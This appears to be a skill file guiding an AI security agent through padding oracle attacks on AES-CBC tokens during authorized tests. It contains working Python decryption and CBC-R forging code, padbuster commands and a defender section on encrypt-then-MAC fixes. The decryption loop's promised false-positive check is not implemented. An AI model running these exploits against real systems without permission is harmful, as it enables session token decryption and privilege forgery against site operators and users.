---
name: padding-oracle
description: Use when you encounter CBC-mode ciphertext with distinguishable
  padding errors on an authorized test, CTF, or code review, and need to
  decrypt or forge messages without the key. Covers identifying the oracle
  (error messages, timing, behavior differences), byte-at-a-time decryption
  with a manual Python 3.12 workflow, CBC-R style encryption of chosen
  plaintexts, tooling with padbuster patterns and Burp Suite 2026.2, and
  analysis support with CyberChef 10.x and OpenSSL 3.x. Use when an
  application decrypts attacker-influenced CBC ciphertext and reveals
  whether padding was valid, or when the crypto-fundamentals skill flagged
  CBC with padding as the primitive.
version: 1.0.0
domain: crypto
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [crypto-fundamentals, rsa-attacks]
tools:
  - name: Python
    version: "3.12"
  - name: OpenSSL
    version: 3.x
  - name: CyberChef
    version: 10.x
  - name: Burp Suite
    version: "2026.2"
---

A padding oracle is any behavior that tells you whether decrypted CBC
ciphertext had valid PKCS#7 padding: a different error message, a timing
difference, or a redirect versus a 500 page. Each oracle answer leaks one
bit of information about the plaintext, and enough answers decrypt the
whole message, then forge new ones, without ever learning the key. This
skill covers the authorized workflow for finding and exploiting padding
oracles: recognizing the oracle, decrypting byte by byte, encrypting
chosen plaintexts, and recommending the fix. All work targets systems you
have written permission to test.

## Quick Workflow

1. Confirm CBC mode and locate the ciphertext: cookies, tokens, URL
   parameters, or hidden form fields.
2. Prove the oracle: flip bytes in the ciphertext and find a
   distinguishable valid versus invalid padding response.
3. Decrypt the target ciphertext byte by byte from the last block
   backward, using the oracle as the guide.
4. Verify the decryption by checking for readable structure.
5. Forge new ciphertexts (CBC-R technique) for chosen plaintexts when
   the test calls for it.
6. Automate with tooling once the manual flow works, and rate-limit
   yourself to stay inside the agreed test window.
7. Report the oracle location, the decrypted sample, and the fix.

## 1. Recognize the target

CBC ciphertext with padding oracles usually appears as:

- An encrypted cookie or token (base64 or hex, length a multiple of 16
  bytes for AES).
- A `?data=` URL parameter carrying encrypted state.
- Encrypted viewstate or session blobs in form fields.

```bash
# Triage a suspicious token: decode and check block alignment
python3 <<'EOF'
import base64
tok = "PASTE_TOKEN_HERE"
raw = base64.b64decode(tok)
print("bytes:", len(raw), "blocks:", len(raw) / 16)
print("block-aligned:", len(raw) % 16 == 0)
EOF
```

Block-aligned ciphertext that changes server behavior when you tamper
with it is the starting signal. Confirm AES-CBC from documentation,
client code (see the mobile and web skills), or the error messages
themselves.

## 2. Prove the oracle

Flip bytes in the last block's preceding block (the IV for block 1, or
ciphertext block N-1 for block N) and watch the server's response.
Valid padding after your flip is rare; invalid padding is the norm, so
the two responses differ.

```bash
# Capture a baseline request in Burp, then tamper the token
# Example with curl: flip the last byte of the second-to-last block
python3 <<'EOF'
import base64
tok = base64.b64decode("PASTE_TOKEN_HERE")
lst = bytearray(tok)
lst[-17] ^= 0x01   # flip one bit in the block before the last
print(base64.b64encode(bytes(lst)).decode())
EOF
```

Send the tampered token and record the response. Then send the original
untampered token. An oracle exists if you can distinguish the two:

- Different HTTP status codes (200 vs 500).
- Different error text ("invalid padding" vs "decryption failed" vs a
  redirect).
- Different response times (padding check fails fast, MAC check fails
  slow, or vice versa).
- Different page content (logged-in page vs login page).

No distinguishable difference means no usable oracle through that
channel. Try other tamper positions and other response aspects before
concluding.

## 3. Decrypt byte by byte

The core loop: to decrypt the last byte of a block, modify the
corresponding byte of the previous block through all 256 values until
the oracle says padding is valid. Valid padding `0x01` means your
modified byte XOR the intermediate value equals 1, which reveals the
intermediate byte, and plaintext = intermediate XOR original byte.

```python
#!/usr/bin/env python3
"""Padding oracle decryption. Fill in the oracle() function for the target."""
import base64, urllib.request

BLOCK = 16

def oracle(ciphertext: bytes) -> bool:
    """Return True when the server says padding is VALID."""
    tok = base64.b64encode(ciphertext).decode()
    url = "https://target.example/check?token=" + tok
    with urllib.request.urlopen(url, timeout=10) as r:
        body = r.read()
    # Adapt: True means valid padding on THIS target
    return b"welcome" in body.lower()

def decrypt_block(prev: bytes, block: bytes) -> bytes:
    intermediate = bytearray(BLOCK)
    plain = bytearray(BLOCK)
    crafted = bytearray(prev)
    for pad_len in range(1, BLOCK + 1):
        # fix already-known tail bytes to produce valid padding
        for i in range(1, pad_len):
            crafted[BLOCK - i] = intermediate[BLOCK - i] ^ pad_len
        for guess in range(256):
            crafted[BLOCK - pad_len] = guess
            if oracle(bytes(crafted) + block):
                # avoid the false positive where original padding was valid:
                # flip one more bit and require the oracle to flip too
                intermediate[BLOCK - pad_len] = guess ^ pad_len
                break
        plain[BLOCK - pad_len] = intermediate[BLOCK - pad_len] ^ prev[BLOCK - pad_len]
        print(f"[*] byte {BLOCK-pad_len}: {plain[BLOCK-pad_len]:#04x}")
    return bytes(plain)

raw = base64.b64decode("PASTE_TOKEN_HERE")
blocks = [raw[i:i+BLOCK] for i in range(0, len(raw), BLOCK)]
# First "previous block" is the IV; handle per target (often prepended)
plaintext = b""
for i in range(len(blocks) - 1, 0, -1):
    plaintext = decrypt_block(blocks[i-1], blocks[i]) + plaintext
print("plaintext:", plaintext)
```

Notes for real targets:

- The false-positive problem: when the original ciphertext already
  has valid padding, your first guess may "succeed" without changing
  anything. Detect it by flipping an adjacent byte and confirming the
  oracle response changes.
- Rate limiting: 256 requests per byte, 16 bytes per block. A 3-block
  token needs roughly 12k requests. Add small delays and stay inside
  the agreed test window; tell the client this is request-heavy.
- The IV: if the token format prepends the IV, block 0 decrypts with
  it. If not, the first block may use a fixed IV you cannot recover
  without the key; later blocks still decrypt fully.

## 4. Verify the decryption

Decrypted bytes should show structure: JSON, serialized session data,
or readable text with PKCS#7 padding at the end (last byte n means n
bytes of value n).

```bash
# Inspect padding validity of your recovered plaintext
python3 <<'EOF'
pt = b'RECOVERED_BYTES_HERE'
pad = pt[-1]
print("pad value:", pad, "valid:", pt.endswith(bytes([pad]) * pad))
print(pt[:-pad])
EOF
```

## 5. Forge ciphertexts (CBC-R)

Once you can decrypt, you can encrypt arbitrary plaintexts without the
key. To produce a ciphertext block C' that decrypts to chosen plaintext
P' under unknown IV handling, use the intermediate values from
decryption: C'[i] = intermediate[i] XOR P'[i], then prepend any valid
previous block.

```python
#!/usr/bin/env python3
"""CBC-R: forge a block decrypting to chosen plaintext."""
BLOCK = 16

def forge_block(intermediate: bytes, want: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(intermediate, want))

# intermediate from the decryption step for the target block position
# forged = forge_block(intermediate, b'admin=true;      ')
# Send forged as the last block with the original preceding block
```

Practical forging usually targets the last block: set
`role=admin` style flags, or flip a boolean in session data. You need
the intermediate bytes for the block you forge, which the decryption
step already gave you.

## 6. Tooling

```bash
# padbuster: classic automated padding oracle exploitation
# Usage pattern against a URL carrying the ciphertext:
padbuster "https://target.example/check?token=BASE64_TOKEN" \
  "BASE64_TOKEN" 16 -cookies "session=abc" -error "Invalid padding"

# Key flags: -plaintext for chosen-plaintext forging, -encoded for URL encoding
```

Route tooling through Burp to inspect and throttle:

```bash
# Python oracle via Burp proxy for visibility
# In oracle(): use http.client with proxy 127.0.0.1:8080, or set
# environment https_proxy=http://127.0.0.1:8080 for urllib
```

CyberChef helps analyze recovered plaintext (detect encodings, parse
structures) and OpenSSL verifies your understanding of the mode:

```bash
# Decrypt locally once you suspect you know the key/IV (sanity check)
openssl enc -d -aes-128-cbc -in cipher.bin -out plain.bin \
  -K <hexkey> -iv <hexiv>
```

## Edge cases

- The oracle is timing-based, not message-based. Measure over many
  samples, use a local network or account for jitter, and set the
  decision threshold from the baseline distribution, not from one
  pair of requests.
- Valid and invalid responses differ only after authentication. Your
  oracle function must hold a valid session; re-login when it
  expires or every decrypt byte misleads you.
- The application uses encrypt-then-MAC correctly. Then tampering
  fails closed with no padding signal, which is the secure design;
  document it as effective and move on.
- The block cipher is not AES (3DES, Blowfish have 8-byte blocks).
  Set BLOCK = 8 and the same math applies.
- The padding is not PKCS#7 (zero padding, ANSI X.923). The oracle
  loop adapts: valid padding has a different shape, but the
  byte-at-a-time strategy is identical.
- Request limits or WAF blocks halt the attack mid-decryption. Slow
  down, rotate politely within the rules, or ask the client for a
  test window without rate limiting.

## Escalation

- Byte-by-byte is too slow for a large blob: decrypt only the blocks
  you need (session flags usually live in one block), not the whole
  token.
- The oracle is weak (only one bit of signal per request): the
  attack still works, it just needs more requests. Budget accordingly
  and confirm the test window covers it.
- You need encryption, not just decryption, and CBC-R feels fragile:
  validate each forged block with the oracle before using it; a
  forged block with bad padding fails closed and tells you so.
- The target is not CBC but ECB: cut-and-paste replaces oracles
  entirely (reorder blocks to promote privileges), which is simpler;
  see crypto-fundamentals.
- The protocol is RSA PKCS#1 v1.5 with a decryption oracle: that is
  Bleichenbacher, a different oracle family with its own workflow;
  do not force the CBC tooling onto it.

## Detection and defender view

Defenders see padding oracle attacks as thousands of similar requests
with slightly mutated tokens from one source, a classic WAF and rate
limit trigger. The durable fix is encrypt-then-MAC (or an AEAD mode
like AES-GCM): verify the MAC before decrypting, and return a single
generic error for any failure so no padding signal leaks. Never branch
on padding validity in observable behavior, including timing. For code
review, flag every `decrypt` call whose errors propagate distinctly,
and every place CBC is used without a MAC. TLS 1.3 removed CBC
cipher suites for exactly this history of oracle attacks.

## Key references

- CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): CBC
  without integrity.
- CWE-696 (Incorrect Behavior Order): MAC checked after decryption
  instead of before.
- CWE-203 (Observable Discrepancy): the oracle itself.
- MITRE ATT&CK T1552 (Unsecured Credentials): when decrypted tokens
  yield credentials.
- Serge Vaudenay, "Security Flaws Induced by CBC Padding" (EUROCRYPT
  2002): the original padding oracle paper.
- OpenSSL documentation: https://docs.openssl.org/
- CyberChef: https://gchq.github.io/CyberChef/
